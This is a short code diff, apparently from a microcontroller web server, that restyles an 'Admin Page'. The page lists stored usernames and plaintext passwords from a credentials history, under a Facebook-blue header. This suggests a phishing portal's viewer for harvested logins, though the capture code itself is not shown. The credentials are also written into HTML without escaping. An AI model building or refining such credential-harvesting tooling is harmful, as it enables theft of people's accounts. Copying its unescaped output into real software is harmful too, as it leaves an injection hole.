@@ -68,15 +68,16 @@ void handleAdmin() {
                           "<title>Admin Page</title>"
                           "<style>"
                           "@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');"
-                          "* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }"
-                          ".container { padding: 0 15px; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: #f0f2f5; }"
-                          ".credentials-table { width: 80%; border-collapse: collapse; margin-top: 20px; }"
-                          ".credentials-table th, .credentials-table td { border: 1px solid #ddd; padding: 8px; text-align: left; }"
+                          "body { margin: 0; padding: 0; font-family: 'Roboto', sans-serif; background-color: #f0f2f5; }"
+                          ".header { background-color: #1877f2; color: #fff; padding: 15px; text-align: center; }"
+                          ".container { max-width: 800px; margin: 20px auto; }"
+                          ".credentials-table { width: 100%; border-collapse: collapse; margin-top: 20px; }"
+                          ".credentials-table th, .credentials-table td { border: 1px solid #ddd; padding: 12px; text-align: left; word-wrap: break-word; max-width: 150px; /* Ajuste conforme necessário */ }"
                           ".credentials-table th { background-color: #f2f2f2; }"
                           "</style>"
                           "</head><body>"
+                          "<div class='header'><h1>Admin Page</h1></div>"
                           "<div class='container'>"
-                          "<h1>Admin Page</h1>"
                           "<table class='credentials-table'>"
                           "<thead>"
                           "<tr>"
@@ -85,17 +86,18 @@ void handleAdmin() {
                           "</tr>"
                           "</thead>"
                           "<tbody>";
-
+  
   for (const auto& credentials : credentialsHistory) {
     adminPageHTML += "<tr>"
                      "<td>" + credentials.username + "</td>"
                      "<td>" + credentials.password + "</td>"
                      "</tr>";
   }
-
+  
   adminPageHTML += "</tbody>"
                    "</table>"
                    "</div></body></html>";
+
 
   webServer.send(200, "text/html", adminPageHTML);
 }
